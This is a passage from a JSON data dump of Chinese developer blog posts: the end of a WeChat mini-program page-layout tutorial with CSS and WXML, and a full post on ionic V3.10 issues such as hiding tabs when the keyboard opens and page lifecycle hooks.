class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003ebottom\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003eline-height\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#333\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-back\u003c/span\u003e,\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-share\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: absolute;\n    \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003ebottom\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003ez-index\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.icon\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: absolute;\n    \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003erpx\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-back\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-back-icon\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eurl\u003c/span\u003e(https://n1image.hjfile.cn/mh/2017/06/06/1305a8ac4dc9347b59cc8c2c667122e5.png) \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e no-repeat;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground-size\u003c/span\u003e: contain\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-list\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-list-icon\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eurl\u003c/span\u003e(https://n1image.hjfile.cn/mh/2017/06/09/1e630ac45547e6ab5260928e1d57a3c6.png) \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e no-repeat;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground-size\u003c/span\u003e: contain\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-btn\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n    \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003eline-height\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-share\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eright\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar-share-icon\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eright\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003erpx;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eurl\u003c/span\u003e(https://n1image.hjfile.cn/mh/2017/06/09/ebc3852fb865bd19182c09ca599d8ac1.png) \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e no-repeat;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground-size\u003c/span\u003e: contain\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.clearBtnDefault\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003eborder-radius\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.clearBtnDefault\u003c/span\u003e\u003cspan class=\"hljs-selector-pseudo\"\u003e:after\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: none;\n    \u003cspan class=\"hljs-attribute\"\u003eborder-radius\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e\u003cbr\u003e页面尾部制作完成，下一步我们将处理中间的文章内容部分。  \u003c/p\u003e\n\u003ch3 id=\"step-4-content-\"\u003eStep 4. 为中间的 content 内容预留位置\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e完整的页面代码如下   \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escroll-view\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003escroll-y\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eenable-back-to-top\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"root-wrap\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"wrapper\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-title\"\u003c/span\u003e\u0026gt;\u003c/span\u003eQuora精选：为什么聪明人总能保持冷静\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-desc cf\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n              \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-desc-author fl\"\u003c/span\u003e\u0026gt;\u003c/span\u003e哈利波特\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e\u0026gt;\u003c/span\u003e\n              \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-desc-date fr\"\u003c/span\u003e\u0026gt;\u003c/span\u003e2017/06/27\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-line under-line\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 增加正文视图位置  --\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"content\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n              文章正文\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n              \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar-back clearBtnDefault\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"icon footbar-back-icon\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar-btn clearBtnDefault\"\u003c/span\u003e\u0026gt;\u003c/span\u003e下一篇\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar-share clearBtnDefault\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"icon footbar-share-icon\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n                  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n              \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escroll-view\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eiKcamp官网：\u003ca href=\"http://www.ikcamp.com\"\u003ehttp://www.ikcamp.com\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e访问官网更快阅读全部免费分享课程：《iKcamp出品｜全网最新｜微信小程序｜基于最新版1.0开发者工具之初中级培训教程分享》。\u003cbr\u003e包含：文章、视频、源代码\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/31/076d086e1d56bd0fb1f51c2abd0b8c08\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eiKcamp原创新书《移动Web前端高效开发实战》已在亚马逊、京东、当当开售。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"-11-11-ikcamp-\"\u003e【11月11号】上海iKcamp最新活动\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/18/e25a9cc8e3c0ff85ce16229e2e4b799c\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e报名地址：\u003ca href=\"http://www.huodongxing.com/event/5409924174200\"\u003ehttp://www.huodongxing.com/event/5409924174200\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e与\u003ccode\u003e“天天练口语”\u003c/code\u003e小程序总榜排名第四、教育类排名第一的研发团队，面对面沟通交流。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514946456.154","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98f4"},"id":"5a4f19dff265da3e5468df92","author":{"$oid":"5a4f5f6218646e1ee8be98e1"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"ionic V3.10 开发踩坑集锦(三)","meta":{"likeCount":0},"tag":["ionic","前端","GitHub"],"comment":[],"shortContent":"这是ionic 开发踩坑的第三篇文章，前两篇参见：ionic V3.10 开发踩坑集锦（一） ，ionic V3.10 开发踩坑集锦（二） 开发环境与上文保持一致。 我们的APP主页使用最常见的底部 Tab，设置界面中退出登录会跳转到 Login 界面。一开始使用的是 NavC…","content":"\u003cblockquote\u003e\n\u003cp\u003eGitHub地址：https://github.com/JerryMissTom ，欢迎关注\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这是ionic 开发踩坑的第三篇文章，前两篇参见：\u003ca target=\"_blank\" href=\"https://juejin.im/post/59e965f06fb9a045076ec8b9\"\u003eionic V3.10 开发踩坑集锦（一）\u003c/a\u003e ，\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a02e73bf265da43085d759d\"\u003eionic V3.10 开发踩坑集锦（二）\u003c/a\u003e 开发环境与上文保持一致。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e从Tab界面跳转到Login界面并隐藏Tab\u003c/h3\u003e\n\u003cp\u003e我们的APP主页使用最常见的底部 \u003ccode\u003eTab\u003c/code\u003e，设置界面中退出登录会跳转到 \u003ccode\u003eLogin\u003c/code\u003e 界面。一开始使用的是 \u003ccode\u003eNavController.setRoot();\u003c/code\u003e ，然后\u003ccode\u003eLogin\u003c/code\u003e 界面中 \u003ccode\u003eTab\u003c/code\u003e 会展示出来，使用其他手段隐藏 \u003ccode\u003eTab\u003c/code\u003e ，但是不优雅。后来查询到一个很好的方法，如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { App } from \u003cspan class=\"hljs-string\"\u003e'ionic-angular/components/app/app'\u003c/span\u003e;\n\n constructor(\n    private app: App\n  ) \n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003etoLoginPage\u003c/span\u003e\u003c/span\u003e(){\n     this.app.getRootNavs()[0].setRoot(LoginPage);\n     // 需要注意的是网上最常见的是下面的写法，但是getRootNav方法被废弃掉\n     // this.app.getRootNav().setRoot(LoginPage);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e在Tab界面中输入法唤起时隐藏Tab\u003c/h3\u003e\n\u003cp\u003eTab的一个界面中有input输入框，当输入文字唤起输入法的时候，tab仍然存在，需要隐藏。具体做法如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e安装\u003ca target=\"_blank\" href=\"https://ionicframework.com/docs/native/keyboard/\"\u003eKeyboard\u003c/a\u003e插件\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eionic cordova plugin add ionic-plugin-keyboard\nnpm install --save @ionic-native/keyboard\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003eapp.module.ts 中\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { Keyboard } from \u003cspan class=\"hljs-string\"\u003e'@ionic-native/keyboard'\u003c/span\u003e;\n...\nproviders:[Keyboard]\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003etab设置\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etab.html\n\u0026lt;ion-tabs \u003cspan class=\"hljs-comment\"\u003e#myTabs\u0026gt;\u003c/span\u003e\n  ...\n\u0026lt;/ion-tabs\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etab.ts\nimport { Component, ElementRef, Renderer, ViewChild } from \u003cspan class=\"hljs-string\"\u003e'@angular/core'\u003c/span\u003e;\nimport { Keyboard } from \u003cspan class=\"hljs-string\"\u003e'@ionic-native/keyboard'\u003c/span\u003e;\nimport { Events, Tabs } from \u003cspan class=\"hljs-string\"\u003e'ionic-angular'\u003c/span\u003e;\n\n@Component({\n  templateUrl: \u003cspan class=\"hljs-string\"\u003e'tabs.html'\u003c/span\u003e\n})\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e class TabsPage {\n\n  @ViewChild(\u003cspan class=\"hljs-string\"\u003e'myTabs'\u003c/span\u003e) tabRef: Tabs;\n  mb: any;\n  \n  constructor(private elementRef: ElementRef,\n    private renderer: Renderer,\n    private keyboard: Keyboard,\n    private event: Events) {\n  }\n\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eionViewDidLoad\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e tabs = this.queryElement(this.elementRef.nativeElement, \u003cspan class=\"hljs-string\"\u003e'.tabbar'\u003c/span\u003e);\n   \n    this.event.subscribe(\u003cspan class=\"hljs-string\"\u003e'hideTabs'\u003c/span\u003e, () =\u0026gt; {\n      this.renderer.setElementStyle(tabs, \u003cspan class=\"hljs-string\"\u003e'display'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'none'\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e SelectTab = this.tabRef.getSelected()._elementRef.nativeElement;\n      \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e content = this.queryElement(SelectTab, \u003cspan class=\"hljs-string\"\u003e'.scroll-content'\u003c/span\u003e);\n      this.mb = content.style[\u003cspan class=\"hljs-string\"\u003e'margin-bottom'\u003c/span\u003e];\n      this.renderer.setElementStyle(content, \u003cspan class=\"hljs-string\"\u003e'margin-bottom'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e)\n    });\n\n    this.event.subscribe(\u003cspan class=\"hljs-string\"\u003e'showTabs'\u003c/span\u003e, () =\u0026gt; {\n      this.renderer.setElementStyle(tabs, \u003cspan class=\"hljs-string\"\u003e'display'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e SelectTab = this.tabRef.getSelected()._elementRef.nativeElement;\n      \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e content = this.queryElement(SelectTab, \u003cspan class=\"hljs-string\"\u003e'.scroll-content'\u003c/span\u003e);\n      this.renderer.setElementStyle(content, \u003cspan class=\"hljs-string\"\u003e'margin-bottom'\u003c/span\u003e, this.mb)\n    });\n  }\n\n  queryElement(elem: HTMLElement, q: string): HTMLElement {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;HTMLElement\u0026gt;elem.querySelector(q);\n  }\n\n    // 一定记得要取消订阅，网上很多没写这个，会带来隐藏的Bug\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eionViewWillUnload\u003c/span\u003e\u003c/span\u003e() {\n    this.event.unsubscribe(\u003cspan class=\"hljs-string\"\u003e'hideTabs'\u003c/span\u003e);\n    this.event.unsubscribe(\u003cspan class=\"hljs-string\"\u003e'showTabs'\u003c/span\u003e);\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"4\"\u003e\n\u003cli\u003e使用界面设置\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eabout.ts\nimport { Subscription } from \u003cspan class=\"hljs-string\"\u003e'rxjs/Subscription'\u003c/span\u003e;\nimport { Keyboard } from \u003cspan class=\"hljs-string\"\u003e'@ionic-native/keyboard'\u003c/span\u003e;\n...\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e class About {\n  private hideSubscription: Subscription;\n  private showSubscription: Subscription;\n  \n  construct(\n  private keyboard: Keyboard,\n  private event: Events\n  ){\n      this.hideSubscription = null;\n      this.showSubscription = null;\n  }\n  \n   \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eionViewDidEnter\u003c/span\u003e\u003c/span\u003e() {\n    this.hideSubscription = this.keyboard.onKeyboardShow().subscribe(() =\u0026gt; this.event.publish(\u003cspan class=\"hljs-string\"\u003e'hideTabs'\u003c/span\u003e));\n    this.showSubscription = this.keyboard.onKeyboardHide().subscribe(() =\u0026gt; this.event.publish(\u003cspan class=\"hljs-string\"\u003e'showTabs'\u003c/span\u003e));\n  }\n  \n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eionViewWillLeave\u003c/span\u003e\u003c/span\u003e() {\n    this.keyboard.close();\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.hideSubscription) {\n      this.hideSubscription.unsubscribe();\n      this.hideSubscription = null;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.showSubscription) {\n      this.showSubscription.unsubscribe();\n      this.showSubscription = null;\n    }\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e\u003ccode\u003eionic\u003c/code\u003e 界面的生命周期\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eionViewDidLoad\u003c/code\u003e 只在界面创建的时候执行一次，假如此界被缓存，重新进入后，不会被触发，可用于一些数据的初始化或赋值。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eionViewDidEnter\u003c/code\u003e 只要在界变为 \u003ccode\u003eactive\u003c/code\u003e 时候就触发一次，不管此界是第一创建还是从缓存中获取。可用于每次进入界面中的网络刷新。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eionViewWillLeave\u003c/code\u003e 在界面将要消失，不再 \u003ccode\u003eactive\u003c/code\u003e 的时候触发。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eionViewWillUnload\u003c/code\u003e 在界面将被 \u003ccode\u003edestroy\u003c/code\u003e 掉，不再存在时候触发，这个时候可以执行取消订阅事件。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eionViewCanEnter\u003c/code\u003e 在界面进入之前判断是否满足条件或权限\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eionViewCanLeave\u003c/code\u003e 在界面离开之前判断是否满足条件或权限\u003c/p\u003e\n","buildTime":"1515150871.0131","__v":0}
